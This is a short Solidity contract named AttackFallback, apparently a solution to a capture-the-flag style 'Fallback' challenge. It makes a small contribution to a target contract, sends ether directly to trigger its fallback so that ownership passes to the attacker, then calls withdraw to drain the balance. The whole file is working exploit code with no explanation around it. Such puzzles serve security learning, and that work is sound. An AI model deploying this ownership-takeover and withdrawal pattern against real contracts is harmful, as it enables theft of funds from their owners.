// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "fallback.sol";

contract AttackFallback {

    Fallback public fallback_contract;

    constructor(address fallback_contract_address){
        fallback_contract = Fallback(payable(fallback_contract_address));
    }

    function make_contribution() public {
        fallback_contract.contribuite{value: 3 wei}();
    }

    function get_contribution() public view returns (uint) {
        return fallback_contract.getContribution();
    }

    function own_the_contract() public {
        payable(address(fallback_contract)).transfer(3 wei);
    }

    function loot_contract() public {
        fallback_contract.withdraw();
    }

    receive() external payable {}
}
